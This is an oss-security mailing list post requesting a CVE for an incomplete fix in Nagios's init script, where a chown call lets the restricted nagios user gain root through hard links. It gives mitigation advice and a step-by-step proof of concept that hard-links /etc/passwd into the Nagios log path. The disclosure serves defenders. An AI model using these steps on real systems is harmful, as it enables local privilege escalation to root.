  oss-security - CVE request: Nagios: Incomplete fix for            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Fri, 30 Dec From: Michael Orlitzky <michael@...itzky.com> To: oss-security@...ts.openwall.com Subject: CVE request: Nagios: Incomplete fix for  Author: Michael Orlitzky (michael@...itzky.com) Software Name: Nagios Vendor Name: Nagios Enterprises, LLC Type of vulnerability: root privilege escalation Reported to vendor:  Exploit Vector -------------- The init script for Nagios calls "chown" on a path under the control of Nagios's (usually restricted) user. describes an attack wherein that restricted user replaces the aforementioned path with a symlink. The root user (via the init script) will -- the next time Nagios is started -- give ownership of the symlink's target to Nagios's user. In that manner, the restricted Nagios user can gain root.  An identical attack not addressed by works with hard links. As long as no special kernel protections are in place, the restricted Nagios user can replace the path (in the directory he controls) by a hard-link. The call to "chown" in the init script affects the target of that hard link.   Attack outcome -------------- The restricted Nagios user gains control of any file on the same filesystem as its runtime directory.   Affected versions ----------------- Versions and older are affected by the symlink attack of those and newer versions, up to the current version are affected by the hard-link attack.   Source code ----------- The fix for is contained in the following commit, which prohibits "chown" from following symlinks only (via the --no-dereference flag):    Mitigation ---------- The creation of the problematic hard link is blocked if the user has the fs.protected_hardlinks sysctl enabled. It is *not enabled* by default in the vanilla Linux kernel, but some distributions patch that default.  It can be enabled with (as root):    sysctl -w fs.protected_hardlinks=1  The grsecurity patches for the Linux kernel provide similar protection when CONFIG_GRKERNSEC_LINK=y.   Exploit -------  The following commands should grant ownership of /etc/passwd to the new, restricted "nagios" user. Beware that in order for the attack to work, some important (but non-default) sysctls are disabled. The two paths /etc/passwd and /usr/local/nagios must live on the same filesystem. Afterwards you should re-enable the two sysctls (if they were enabled to begin with), clean up /usr/local, and remove the "nagios" user.    sudo mkdir -p /usr/local/tmp \                 /usr/local/etc/init.d \                 /usr/local/etc/apache2   sudo chmod /usr/local/tmp    wget   tar -xf   rm   cd   sudo useradd nagios -m -d /home/nagios   ./configure --with-nagios-user=nagios \               --with-temp-dir=/usr/local/tmp \               --with-init-dir=/usr/local/etc/init.d \               --with-httpd-conf=/usr/local/etc/apache2   make all   sudo make install   sudo make install-config   sudo make install-init   sudo sysctl -w kernel.grsecurity.linking_restrictions=0   sudo sysctl -w fs.protected_hardlinks=0    sudo -u nagios -s   ln -f /etc/passwd /usr/local/nagios/var/nagios.log   exit    sudo /usr/local/etc/init.d/nagios start   ls /etc/passwd  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      